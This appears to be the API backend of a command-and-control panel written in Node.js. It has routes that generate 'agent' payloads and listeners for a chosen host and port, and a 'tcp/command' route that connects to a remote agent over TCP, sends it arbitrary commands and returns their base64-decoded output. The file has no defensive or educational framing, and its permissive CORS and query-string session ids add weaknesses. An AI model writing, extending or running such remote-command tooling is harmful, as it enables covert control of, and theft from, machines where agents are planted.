import { createSession, getSession, findByToken, deleteSession } from './lib/db.js';
import { generateAgent, generateListener } from './lib/payloadGenerator.js';
import net from 'node:net';

export const config = { api: { bodyParser: true } };

function cors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

function json(res, status, body) {
  cors(res);
  res.status(status).json(body);
}

function parseCookies(req) {
  const h = req.headers.cookie || '';
  const m = /sid=([^;]+)/.exec(h);
  return m ? m[1] : null;
}

function sessionId(req) {
  return parseCookies(req) || req.query?.sid || '';
}

function runAgentCommand({ host, port, token, command }) {
  return new Promise((resolve, reject) => {
    const socket = net.createConnection({ host, port });
    const timeout = setTimeout(() => { socket.destroy(); reject(new Error('timeout')); }, 15000);
    let settled = false;
    let buf = '';
    let agentOk = false;

    socket.setEncoding('utf8');

    socket.once('connect', () => {
      socket.write('PULL\n');
    });

    socket.on('data', (chunk) => {
      buf += chunk;
      let idx;
      while ((idx = buf.indexOf('\n')) >= 0) {
        const line = buf.slice(0, idx).replace(/\r$/, '');
        buf = buf.slice(idx + 1);
        if (!agentOk && line === 'AGENT ON') {
          agentOk = true;
          socket.write('CMD ' + command + '\n');
          continue;
        }
        if (line.startsWith('RES ')) {
          try {
            const decoded = Buffer.from(line.slice(4).trim(), 'base64').toString('utf8');
            if (!settled) { settled = true; clearTimeout(timeout); socket.destroy(); resolve({ ok: true, output: decoded }); }
          } catch {
            if (!settled) { settled = true; clearTimeout(timeout); socket.destroy(); resolve({ ok: true, output: line }); }
          }
          return;
        }
        if (line === 'AGENT ON') continue;
        if (line.startsWith('ERR')) {
          if (!settled) { settled = true; clearTimeout(timeout); socket.destroy(); reject(new Error(line)); }
          return;
        }
      }
    });

    socket.on('error', (err) => {
      if (!settled) { settled = true; clearTimeout(timeout); reject(err); }
    });

    socket.on('close', () => {
      if (!settled) { settled = true; clearTimeout(timeout); reject(new Error('connection closed')); }
    });
  });
}

export default async function handler(req, res) {
  if (req.method === 'OPTIONS') { cors(res); return res.status(200).end(); }

  const { pathname } = new URL(req.url, 'http://localhost');
  const segs = pathname.replace(/^\/api\/?/, '/').split('/').filter(Boolean);
  const route = segs.join('/');

  try {
    switch (route) {
      case 'auth/login': {
        if (req.method !== 'POST') return json(res, 405, { error: 'method not allowed' });
        const { host, port } = req.body || {};
        const h = String(host || '').trim();
        const p = Number(port);
        if (!h) return json(res, 400, { error: 'host required' });
        if (!/^[a-zA-Z0-9.\-:\[\]]+$/.test(h)) return json(res, 400, { error: 'host has invalid characters' });
        if (!Number.isInteger(p) || p <= 0 || p > 65535) return json(res, 400, { error: 'port invalid' });
        const session = createSession({ host: h, port: p });
        res.setHeader('Set-Cookie', `sid=${session.id}; Path=/; HttpOnly; SameSite=Lax; Max-Age=604800`);
        return json(res, 200, { ok: true, host: session.host, port: session.port });
      }

      case 'auth/me': {
        const sid = sessionId(req);
        const s = getSession(sid);
        if (!s) return json(res, 401, { error: 'not authenticated' });
        return json(res, 200, { host: s.host, port: s.port });
      }

      case 'auth/logout': {
        const sid = sessionId(req);
        if (sid) deleteSession(sid);
        res.setHeader('Set-Cookie', 'sid=; Path=/; Max-Age=0');
        return json(res, 200, { ok: true });
      }

      case 'tcp/command': {
        const sid = sessionId(req);
        const s = getSession(sid);
        if (!s) return json(res, 401, { error: 'not authenticated' });
        if (req.method !== 'POST') return json(res, 405, { error: 'method not allowed' });
        const command = String((req.body || {}).command || '').trim();
        if (!command) return json(res, 400, { error: 'empty command' });
        const result = await runAgentCommand({ host: s.host, port: s.port, token: s.agentToken, command });
        return json(res, 200, result);
      }

      case 'tcp/status': {
        const sid = sessionId(req);
        const s = getSession(sid);
        if (!s) return json(res, 401, { error: 'not authenticated' });
        return json(res, 200, { host: s.host, port: s.port });
      }

      case 'payload/generate': {
        const sid = sessionId(req);
        const s = getSession(sid);
        if (!s) return json(res, 401, { error: 'not authenticated' });
        const { language = 'python' } = req.body || {};
        const result = generateAgent({ language, host: s.host, port: s.port, token: s.agentToken });
        return json(res, 200, result);
      }

      case 'payload/listener': {
        const sid = sessionId(req);
        const s = getSession(sid);
        if (!s) return json(res, 401, { error: 'not authenticated' });
        const result = generateListener({ port: s.port, token: s.agentToken });
        return json(res, 200, result);
      }

      default:
        return json(res, 404, { error: 'not found: ' + route });
    }
  } catch (err) {
    return json(res, 500, { error: err.message });
  }
}
